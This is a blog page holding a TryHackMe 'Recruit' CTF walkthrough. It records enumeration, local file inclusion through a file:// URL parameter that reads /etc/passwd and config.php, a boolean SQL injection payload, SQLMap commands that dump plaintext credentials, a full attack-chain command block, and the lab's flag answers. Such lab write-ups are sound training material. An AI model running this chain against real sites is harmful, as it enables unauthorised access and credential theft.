@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Recruit | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF: Nmap enumeration, gobuster directory discovery, Burp Suite intercept, LFI via file:// scheme, SQLi discovery, SQLMap credential dump, admin access.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/recruit-ctf.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+    <link rel="stylesheet" href="/assets/css/accents.css">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<meta property="og:url" content="https://jennshaggy.github.io/recruit-ctf.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Recruit">
+<meta property="og:description" content="TryHackMe CTF: Nmap enumeration, gobuster directory discovery, Burp Suite intercept, LFI via file:// scheme, SQLi discovery, SQLMap credential dump, admin access.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Recruit">
+<meta name="twitter:description" content="TryHackMe CTF: Nmap enumeration, gobuster directory discovery, Burp Suite intercept, LFI via file:// scheme, SQLi discovery, SQLMap credential dump, admin access.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Recruit</h1>
+    <div class="post-description">TryHackMe CTF. Enumerate a recruitment web app, discover LFI via the file:// scheme, recover credentials from config.php, and chain SQL injection through SQLMap to dump admin credentials.</div>
+  </header>
+
+  <div class="post-content">
+
+<h2>Enumeration</h2>
+
+<p>Standard Nmap scan, then a second pass with vuln scripts:</p>
+
+<pre><code class="language-bash">nmap -Pn -sC -sV -T4 TARGET_IP -oA recruit_nmap</code></pre>
+
+<pre><code class="language-bash">nmap -sS -Pn -sC -sV --script=vuln -T4 -A TARGET_IP -oA recruit_nmap_extended.txt</code></pre>
+
+<img src="/images/recruit/Screenshot 2026-06-26 at 5.48.54 PM.png" alt="Nmap scan results showing open ports and service versions" style="max-width:100%;margin:2rem 0;">
+
+<p>I&rsquo;m already liking what I see.</p>
+
+<img src="/images/recruit/Screenshot 2026-06-26 at 5.49.38 PM.png" alt="Nmap vuln script output part 1" style="max-width:100%;margin:2rem 0;">
+<img src="/images/recruit/Screenshot 2026-06-26 at 5.50.05 PM.png" alt="Nmap vuln script output part 2" style="max-width:100%;margin:2rem 0;">
+<img src="/images/recruit/Screenshot 2026-06-26 at 5.50.31 PM.png" alt="Nmap vuln script output part 3" style="max-width:100%;margin:2rem 0;">
+
+<p>Open ports and initial findings:</p>
+
+<ul>
+<li>Port 22 (SSH)</li>
+<li>Port 53 (DNS)</li>
+<li>Port 80 (HTTP)</li>
+<li><code>PHPSESSID</code>: <code>httponly</code> flag not set</li>
+<li><code>/mail/</code> subdirectory</li>
+<li><code>/assets/</code> subdirectory</li>
+<li><code>/phpmyadmin/</code> subdirectory</li>
+<li><code>/server-status/</code> subdirectory</li>
+</ul>
+
+<h2>Web Fingerprinting</h2>
+
+<pre><code class="language-bash">curl -I http://TARGET_IP:80</code></pre>
+
+<img src="/images/recruit/Screenshot 2026-06-26 at 5.59.41 PM.png" alt="curl -I response showing 200 OK and fresh PHPSESSID cookie" style="max-width:100%;margin:2rem 0;">
+
+<p>Well, well. A fresh cookie and a 200 OK.</p>
+
+<h2>Application Mapping</h2>
+
+<p>Browser visit to port 80 confirms a login form.</p>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 7.49.51 AM.png" alt="Login form on port 80" style="max-width:100%;margin:2rem 0;">
+
+<p>There&rsquo;s also a small link off to <code>Access API</code>, which feels a bit like a hacker honeypot trap but I&rsquo;m here for it.</p>
+
+<p>Intercepting a login attempt to analyze the form&rsquo;s behavior. Testing <code>admin:admin</code>:</p>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 7.54.09 AM.png" alt="Burp Suite intercept of login form request" style="max-width:100%;margin:2rem 0;">
+
+<p>Line 54 in the Burp response confirms <code>/api.php</code> exists.</p>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 7.55.24 AM.png" alt="Burp response body showing /api.php endpoint" style="max-width:100%;margin:2rem 0;">
+
+<h2>Session Cookie Analysis</h2>
+
+<p>Fingerprinting the server generates a fresh session cookie. The <code>path=/</code> value aligns with the login page path. Testing whether it grants access to protected paths:</p>
+
+<pre><code class="language-bash">curl -i -b 'PHPSESSID=[session_id]' http://TARGET_IP/admin/
+curl -i -b 'PHPSESSID=[session_id]' http://TARGET_IP/dashboard/
+curl -i -b 'PHPSESSID=[session_id]' http://TARGET_IP/api.php/</code></pre>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 8.00.31 AM.png" alt="Dev Tools Storage showing session cookie value and path" style="max-width:100%;margin:2rem 0;">
+<img src="/images/recruit/Screenshot 2026-06-27 at 8.01.55 AM.png" alt="Session cookie path aligned with port 80 login root" style="max-width:100%;margin:2rem 0;">
+
+<p>The curl to <code>/api.php</code> returns promising leads.</p>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 8.09.36 AM.png" alt="api.php response showing file fetch endpoint and parameter documentation" style="max-width:100%;margin:2rem 0;">
+<img src="/images/recruit/Screenshot 2026-06-27 at 8.10.10 AM.png" alt="api.php response continued | /file.php?cv= accepts a URL parameter" style="max-width:100%;margin:2rem 0;">
+
+<p><code>/file.php?cv=&lt;URL&gt;</code> makes the server fetch a URL on behalf of the request. The FAQ&rsquo;s phrasing &mdash; &ldquo;restricted locations may be blocked&rdquo; &mdash; strongly suggests the intended challenge is bypassing an internal-address filter.</p>
+
+<h2>LFI Discovery</h2>
+
+<p>Testing whether the application can fetch its own loopback web service:</p>
+
+<pre><code class="language-bash">curl -i -b 'PHPSESSID=[session_id]' \
+'http://TARGET_IP/file.php?cv=http://127.0.0.1/'</code></pre>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 8.11.58 AM.png" alt="Loopback fetch attempt response | scopes hypothesis to LFI rather than SSRF" style="max-width:100%;margin:2rem 0;">
+
+<p>Interesting. Now the hypothesis scopes in LFI, not unrestricted SSRF.</p>
+
+<p>Testing whether <code>file.php</code> accepts the <code>file://</code> scheme:</p>
+
+<pre><code class="language-bash">curl -i -b 'PHPSESSID=[session_id]' \
+'http://TARGET_IP/file.php?cv=file:///etc/passwd'</code></pre>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 8.14.02 AM.png" alt="/etc/passwd contents returned via file:// scheme | LFI confirmed" style="max-width:100%;margin:2rem 0;">
+
+<p>I don&rsquo;t want to head too far down a rabbit hole here. We can <code>curl</code> deeper as needed.</p>
+
+<h2>Directory Enumeration</h2>
+
+<pre><code class="language-bash">gobuster dir \
+  -u http://TARGET_IP/ \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -x php,txt,html \
+  -t 20</code></pre>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 8.30.27 AM.png" alt="gobuster results | clean enumeration with config.php (Status: 200 | Size: 0) as standout find" style="max-width:100%;margin:2rem 0;">
+
+<p>This was one of the cleanest running gobuster scans I&rsquo;ve witnessed.</p>
+
+<p><code>config.php (Status: 200) [Size: 0]</code> is the standout. A zero-byte response is expected when PHP executes without printing anything. The question is whether <code>file.php</code> can return its source through a PHP filter.</p>
+
+<p>Testing <code>php://filter</code> to expose the source as Base64:</p>
+
+<pre><code class="language-bash">curl -s -b 'PHPSESSID=[session_id]' \
+'http://TARGET_IP/file.php?cv=php://filter/convert.base64-encode/resource=/var/www/html/config.php'</code></pre>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 9.06.08 AM.png" alt="php://filter attempt | filter rejected by the endpoint" style="max-width:100%;margin:2rem 0;">
+
+<p>That rules out <code>php://filter</code>. Testing the same-host fetch with a known file from gobuster:</p>
+
+<pre><code class="language-bash">curl -i -b 'PHPSESSID=[session_id]' \
+'http://TARGET_IP/file.php?cv=http://TARGET_IP/footer.php'</code></pre>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 9.05.53 AM.png" alt="Same-host HTTP fetch of footer.php | 200 OK but no useful content exposed" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Note:</strong> The IP and Session ID change here because I attended BSides Athens. Well worth it.</p>
+
+<h2>/mail/ Investigation</h2>
+
+<pre><code class="language-bash">curl -i http://TARGET_IP/mail/</code></pre>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 3.11.45 PM.png" alt="curl to /mail/ directory | mail.log visible" style="max-width:100%;margin:2rem 0;">
+
+<p><code>mail.log</code> is a worthy local-file target.</p>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 3.20.14 PM.png" alt="mail.log contents | HR username and credential location revealed" style="max-width:100%;margin:2rem 0;">
+
+<p>Feels a bit like a message in a bottle washed up on the shore.</p>
+
+<p><code>mail.log</code> contains the missing pieces, all wrapped up in an HR package:</p>
+
+<ul>
+<li>HR username: <code>hr</code></li>
+<li>HR credential location: <code>config.php</code></li>
+<li>Admin credentials are only in the backend database</li>
+</ul>
+
+<h2>Credential Extraction</h2>
+
+<p>The next move is testing whether the fetch endpoint accepts the local hostname and file.</p>
+
+<pre><code class="language-bash">curl -i -b 'PHPSESSID=[session_id]' \
+'http://TARGET_IP/file.php?cv=http://localhost/config.php'</code></pre>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 3.33.38 PM.png" alt="localhost fetch attempt blocked | loopback HTTP filtered" style="max-width:100%;margin:2rem 0;">
+
+<p>Loopback HTTP is blocked. But <code>file.php</code> already confirmed it reads via <code>file://</code>. Testing directly against <code>config.php</code>:</p>
+
+<pre><code class="language-bash">curl -i -b 'PHPSESSID=[session_id]' \
+'http://TARGET_IP/file.php?cv=file://config.php'</code></pre>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 3.38.47 PM.png" alt="file://config.php returns PHP source including HR_PASSWORD" style="max-width:100%;margin:2rem 0;">
+
+<p>Score.</p>
+
+<p>Sorry not sorry, HR. You just got pwned. Was this the password IT set up and told you to change immediately? Tsk, tsk.</p>
+
+<p><code>config.php</code> reveals:</p>
+
+<ul>
+<li>App name and version</li>
+<li>Production/debug state</li>
+<li><code>API_Enabled</code> and <code>API_Version</code></li>
+<li><code>HR_PASSWORD</code></li>
+</ul>
+
+<h2>User Access</h2>
+
+<p>Back to the login form on port 80.</p>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 3.45.12 PM.png" alt="Successful login as HR user" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>What is the flag value after logging in as a normal user?</strong><br>
+<code>THM{LOGGED_IN_USER}</code></p>
+
+<p>This is our dashboard, which includes a search function and <code>Access API</code> link. Developer Bob Smith is under review, indicating a potential active approval process. Bob&rsquo;s status shows stored workflow data, but we do not yet have evidence of an approval action. Dashboard URL: <code>/dashboard.php</code>.</p>
+
+<h2>SQL Injection Discovery</h2>
+
+<p>Lets leverage Dev Tools &gt; Network to investigate Bob and the web app&rsquo;s behavior further.</p>
+
+<p>The search for <code>Bob</code> reveals&hellip;</p>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 10.15.27 PM.png" alt="Dev Tools Network tab showing search GET parameter and Bob Smith result" style="max-width:100%;margin:2rem 0;">
+
+<ul>
+<li>The search uses the <code>GET</code> parameter <code>search</code></li>
+<li>The app does name filtering</li>
+<li>Searching for <code>Bob</code> only returns <code>Bob Smith</code></li>
+<li>The search value is reflected back into the search field</li>
+</ul>
+
+<p>All duly noted.</p>
+
+<p>Let&rsquo;s try a search for <code>'</code>:</p>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 10.13.33 PM.png" alt="SQL syntax error returned after single-quote input" style="max-width:100%;margin:2rem 0;">
+
+<p>Well, well. This is exactly what I was hoping to witness.</p>
+
+<p>If you cannot see the red <code>SQL Error</code>, it reads:
+<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1</code></p>
+
+<p>Is it an error, web app? Or is it, as The Cardigans sang, &ldquo;my favorite game&hellip;&rdquo;</p>
+
+<p>In more professional verbiage:</p>
+<ul>
+<li><code>SQL Injection</code> = Confirmed.</li>
+<li>As discovered in the app&rsquo;s response to the search for <code>Bob</code>, <code>/dashboard.php</code> uses the <code>GET</code> parameter: <code>/dashboard.php?search=</code></li>
+</ul>
+
+<p>We&rsquo;ve confirmed that user-controlled search input is inserted into a SQL query without safe parameterization.</p>
+
+<p>The <code>%</code> in the error suggest the backend is using <code>LIKE '%&lt;input&gt;%'</code> search patterns.</p>
+
+<p>A Boolean-based search for <code>%' OR 1=1 -- -</code> changed the query logic and returned all four team members.</p>
+
+<p><code>'</code> returned none, but <code>%' OR 1=1 -- -</code> returned all. Score again.</p>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 10.48.40 PM.png" alt="Boolean injection returns all four team members" style="max-width:100%;margin:2rem 0;">
+
+<h2>SQLMap Enumeration</h2>
+
+<p>Fresh session cookie from Dev Tools. Enumerating databases:</p>
+
+<pre><code class="language-bash">sqlmap -u "http://TARGET_IP/dashboard.php?search=Bob" \
+  --cookie="PHPSESSID=[session_id]" \
+  -p search \
+  --batch \
+  --dbs</code></pre>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 11.09.07 PM.png" alt="SQLMap confirming GET parameter search is vulnerable" style="max-width:100%;margin:2rem 0;">
+<img src="/images/recruit/Screenshot 2026-06-27 at 11.09.33 PM.png" alt="SQLMap database list" style="max-width:100%;margin:2rem 0;">
+
+<p><code>GET parameter 'search' is vulnerable</code>. Databases discovered: <code>information_schema</code>, <code>mysql</code>, <code>performance_schema</code>, <code>phpmyadmin</code>, <code>recruit_db</code>, <code>sys</code>.</p>
+
+<p>Enumerating <code>recruit_db</code> tables:</p>
+
+<pre><code class="language-bash">sqlmap -u "http://TARGET_IP/dashboard.php?search=Bob" \
+  --cookie="PHPSESSID=[session_id]" \
+  -p search \
+  --batch \
+  -D recruit_db \
+  --tables</code></pre>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 11.20.52 PM.png" alt="SQLMap table enumeration for recruit_db" style="max-width:100%;margin:2rem 0;">
+<img src="/images/recruit/Screenshot 2026-06-27 at 11.22.27 PM.png" alt="recruit_db tables | users table confirmed" style="max-width:100%;margin:2rem 0;">
+
+<p>Enumerating the <code>users</code> table columns:</p>
+
+<pre><code class="language-bash">sqlmap -u "http://TARGET_IP/dashboard.php?search=Bob" \
+  --cookie="PHPSESSID=[session_id]" \
+  -p search \
+  --batch \
+  -D recruit_db \
+  -T users \
+  --columns</code></pre>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 11.25.28 PM.png" alt="users table structure | id | username | password columns confirmed" style="max-width:100%;margin:2rem 0;">
+
+<p>Credentials confirmed in the database. Dumping the three columns:</p>
+
+<pre><code class="language-bash">sqlmap -u "http://TARGET_IP/dashboard.php?search=Bob" \
+  --cookie="PHPSESSID=[session_id]" \
+  -p search \
+  --batch \
+  -D recruit_db \
+  -T users \
+  -C id,username,password \
+  --dump</code></pre>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 11.35.08 PM.png" alt="SQLMap dump | admin credentials stored in plain text" style="max-width:100%;margin:2rem 0;">
+
+<p>Admin credentials stored in plain text.</p>
+
+<h2>Admin Access</h2>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 11.38.28 PM.png" alt="Successful admin login" style="max-width:100%;margin:2rem 0;">
+
+<p>Admin = pwned.</p>
+
+<p><strong>What is the flag value after logging in as admin?</strong><br>
+<code>THM{LOGGED_IN_ADM1N1}</code></p>
+
+<img src="/images/recruit/Screenshot 2026-06-27 at 11.39.40 PM.png" alt="Admin dashboard | completion confirmed" style="max-width:100%;margin:2rem 0;">
+
+<p>Cue the confetti&hellip;</p>
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code class="language-bash"># 1. Recon
+nmap -Pn -sC -sV -T4 TARGET_IP -oA recruit_nmap
+nmap -sS -Pn -sC -sV --script=vuln -T4 -A TARGET_IP -oA recruit_nmap_extended.txt
+# Ports: 22 SSH, 53 DNS, 80 HTTP | PHPSESSID httponly flag not set | /mail/, /phpmyadmin/, /server-status/
+curl -I http://TARGET_IP:80
+# 200 OK, fresh PHPSESSID cookie
+
+# 2. Application mapping
+# Browser: login form at :80, Access API link present
+# Burp intercept login attempt -> /api.php confirmed line 54
+# /api.php: /file.php?cv=&lt;URL&gt; fetches URLs server-side
+
+# 3. Session cookie analysis
+curl -i -b 'PHPSESSID=[session_id]' http://TARGET_IP/admin/
+curl -i -b 'PHPSESSID=[session_id]' http://TARGET_IP/dashboard/
+curl -i -b 'PHPSESSID=[session_id]' http://TARGET_IP/api.php/
+
+# 4. LFI discovery
+curl -i -b 'PHPSESSID=[session_id]' 'http://TARGET_IP/file.php?cv=http://127.0.0.1/'
+# Loopback blocked -> scopes to LFI
+curl -i -b 'PHPSESSID=[session_id]' 'http://TARGET_IP/file.php?cv=file:///etc/passwd'
+# LFI confirmed via file:// scheme
+
+# 5. Directory enumeration
+gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 20
+# config.php (Status: 200, Size: 0) | /mail/
+
+# 6. /mail/ investigation
+curl -i http://TARGET_IP/mail/
+# mail.log: HR username = hr | HR password location = config.php | admin creds in DB only
+
+# 7. Credential extraction
+curl -i -b 'PHPSESSID=[session_id]' 'http://TARGET_IP/file.php?cv=http://localhost/config.php'
+# localhost blocked
+curl -i -b 'PHPSESSID=[session_id]' 'http://TARGET_IP/file.php?cv=file://config.php'
+# config.php returns HR_PASSWORD -> login as hr -> user flag
+
+# 8. SQL injection discovery
+# Dashboard search: GET /dashboard.php?search=
+# ' -> SQL syntax error confirms LIKE '%&lt;input&gt;%' pattern
+# %' OR 1=1 -- - -> all records returned
+
+# 9. SQLMap enumeration and dump
+sqlmap -u "http://TARGET_IP/dashboard.php?search=Bob" --cookie="PHPSESSID=[session_id]" -p search --batch --dbs
+sqlmap -u "http://TARGET_IP/dashboard.php?search=Bob" --cookie="PHPSESSID=[session_id]" -p search --batch -D recruit_db --tables
+sqlmap -u "http://TARGET_IP/dashboard.php?search=Bob" --cookie="PHPSESSID=[session_id]" -p search --batch -D recruit_db -T users --columns
+sqlmap -u "http://TARGET_IP/dashboard.php?search=Bob" --cookie="PHPSESSID=[session_id]" -p search --batch -D recruit_db -T users -C id,username,password --dump
+# Admin credentials in plaintext -> login as admin -> admin flag</code></pre>
+
+<p>Nmap surfaces PHPSESSID httponly flag not set and key subdirectories. LFI confirmed via file:// scheme. mail.log reveals HR credential location. file://config.php returns HR_PASSWORD directly. SQL injection in dashboard search confirmed via error-based detection, enumerated and dumped via SQLMap. Admin credentials stored in plaintext.</p>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
